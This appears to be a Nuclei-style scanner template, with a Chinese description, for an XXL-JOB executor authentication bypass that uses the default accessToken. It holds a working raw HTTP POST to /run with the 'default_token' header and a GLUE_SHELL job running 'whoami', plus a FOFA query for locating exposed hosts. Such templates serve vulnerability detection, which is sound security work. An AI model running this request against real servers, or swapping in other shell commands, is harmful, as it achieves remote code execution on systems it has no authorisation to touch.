id: xxl-job-executor-default-accesstoken-rce

info:
  tags: xxl-job-executor-default-accesstoken-rce1
  name: XXL-JOB默认accessToken身份绕过RCE
  author: xc
  severity: high
  description: XXL-JOB 是一款开源的分布式任务调度平台，用于实现大规模任务的调度和执行。XXL-JOB 默认配置下，用于调度通讯的 accessToken 不是随机生成的，而是使用 application.properties 配置文件中的默认值。在实际使用中如果没有修改默认值，攻击者可利用此绕过认证调用 executor，执行任意代码，从而获取服务器权限。经分析和研判，该漏洞利用难度低，可导致远程代码执行。
  metadata:
    max-request: 1
    verified: true
    fofa-query: '"invalid request, HttpMethod not support" && port="9999" '

variables:
  randjobid: "{{rand_int(999,999999)}}"
  datetime: '{{date_time("%Y-%M-%D %H:%m:%s")}}'
  unix_time: '{{date_time("{{datetime}}",unix_time())}}'
http:
  - raw:
      - |
        @timeout: 25s
        POST /run HTTP/1.1
        Host: {{Host}}:9999
        XXL-JOB-ACCESS-TOKEN: default_token
        Content-Type: application/json

        {
          "jobId": {{randjobid}},
          "executorHandler": "demoJobHandler",
          "executorParams": "demoJobHandler",
          "executorBlockStrategy": "COVER_EARLY",
          "executorTimeout": 0,
          "logId": {{randjobid}},
          "logDateTime": {{unix_time}},
          "glueType": "GLUE_SHELL",
          "glueSource": "whoami",
          "glueUpdatetime": {{unix_time}},
          "broadcastIndex": 0,
          "broadcastTotal": 0
        }

    req-condition: true
    matchers-condition: and
    matchers:
      - type: word
        words:
          - '"code":200'

      - type: word
        part: header
        words:
          - 'text/html'

      - type: status
        status:
          - 200
          
